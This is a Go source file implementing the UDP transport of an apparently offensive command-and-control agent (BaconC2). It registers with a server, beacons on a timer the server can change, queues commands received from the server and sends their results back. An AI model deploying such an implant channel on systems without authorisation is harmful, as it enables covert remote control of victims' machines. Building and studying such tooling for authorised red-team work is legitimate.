package transport

import (
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

type UDPTransport struct {
	serverHost     string
	serverPort     int
	agentID        string
	conn           *net.UDPConn
	commandQueue   queue.ICommandQueue
	resultQueue    queue.IResultQueue
	beaconInterval time.Duration
	stopChan       chan struct{}
	mu             sync.Mutex
}

func NewUDPTransport(host string, port int, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue) ITransportProtocol {
	return &UDPTransport{
		serverHost:     host,
		serverPort:     port,
		agentID:        agentID,
		commandQueue:   commandQueue,
		resultQueue:    resultQueue,
		beaconInterval: 10 * time.Second,
		stopChan:       make(chan struct{}),
	}
}

func (t *UDPTransport) Initialize(agent models.Agent) error {
	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", t.serverHost, t.serverPort))
	if err != nil {
		return fmt.Errorf("failed to resolve UDP address: %w", err)
	}

	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		return fmt.Errorf("failed to connect to UDP server: %w", err)
	}

	t.mu.Lock()
	t.conn = conn
	t.mu.Unlock()

	jsonData, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("failed to marshal agent: %w", err)
	}

	t.mu.Lock()
	if t.conn == nil {
		t.mu.Unlock()
		return fmt.Errorf("UDP connection not initialized")
	}
	_, err = t.conn.Write(jsonData)
	t.mu.Unlock()
	if err != nil {
		return fmt.Errorf("UDP registration error: %w", err)
	}

	return nil
}

func (t *UDPTransport) Start() error {
	go t.beaconLoop()
	return nil
}

func (t *UDPTransport) sendBeacon() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn == nil {
		return fmt.Errorf("UDP connection not initialized")
	}

	// Send beacon message
	beacon := struct {
		ID string `json:"id"`
	}{ID: t.agentID}
	jsonData, err := json.Marshal(beacon)
	if err != nil {
		return fmt.Errorf("failed to marshal beacon: %w", err)
	}

	_, err = t.conn.Write(jsonData)
	if err != nil {
		return fmt.Errorf("UDP beacon error: %w", err)
	}

	// Set read deadline for response
	t.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buffer := make([]byte, 4096)
	n, _, err := t.conn.ReadFromUDP(buffer)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return nil
		}
		return fmt.Errorf("UDP read error: %w", err)
	}

	// Parse server response
	var response struct {
		Command        models.Command `json:"command"`
		Status         string         `json:"status,omitempty"`
		NextBeacon     int            `json:"nextBeacon,omitempty"`
		RequestResults bool           `json:"requestResults"`
	}
	if err := json.Unmarshal(buffer[:n], &response); err != nil {
		return fmt.Errorf("failed to unmarshal response: %w", err)
	}

	// Update beacon interval if provided
	if response.NextBeacon > 0 {
		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
	}

	// If only "status" is returned (e.g., "acknowledged"), return empty command
	if response.Command.ID == "" && response.Status == "acknowledged" {
		return nil
	}

	// Queue the command
	if err := t.commandQueue.Add(response.Command); err != nil {
		return fmt.Errorf("failed to queue command: %w", err)
	}

	return nil
}

func (t *UDPTransport) SendResults(cmd models.Command) models.CommandResult {
	results, err := t.resultQueue.List()
	if err != nil {
		return models.CommandResult{
			Status: models.CommandStatusFailed,
			Output: fmt.Sprintf("failed to get results from queue: %v", err),
		}
	}

	if len(results) == 0 {
		return models.CommandResult{}
	}

	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn == nil {
		return models.CommandResult{
			Status: models.CommandStatusFailed,
			Output: "UDP connection not initialized",
		}
	}

	var firstResult models.CommandResult
	for i, result := range results {
		jsonData, err := json.Marshal(result)
		if err != nil {
			return models.CommandResult{
				Status: models.CommandStatusFailed,
				Output: fmt.Sprintf("failed to marshal result: %v", err),
			}
		}

		_, err = t.conn.Write(jsonData)
		if err != nil {
			return models.CommandResult{
				Status: models.CommandStatusFailed,
				Output: fmt.Sprintf("UDP result send error: %v", err),
			}
		}

		if i == 0 {
			firstResult = result
		}
	}

	// Clear the queue after successful send
	for i := 0; i < len(results); i++ {
		_, err := t.resultQueue.RemoveFirst()
		if err != nil {
			return models.CommandResult{
				Status: models.CommandStatusFailed,
				Output: fmt.Sprintf("failed to clear result queue: %v", err),
			}
		}
	}

	return firstResult
}
func (t *UDPTransport) beaconLoop() {
	ticker := time.NewTicker(t.beaconInterval)
	defer ticker.Stop()

	for {
		select {
		case <-t.stopChan:
			return
		case <-ticker.C:
			if err := t.sendBeacon(); err != nil {
				// Log error but continue
				fmt.Printf("Beacon send failed: %v\n", err)
			}
		}
	}
}

func (t *UDPTransport) Stop() error {
	close(t.stopChan)
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn != nil {
		return t.conn.Close()
	}
	return nil
}

func (t *UDPTransport) GetBeaconInterval() time.Duration {
	return t.beaconInterval
}
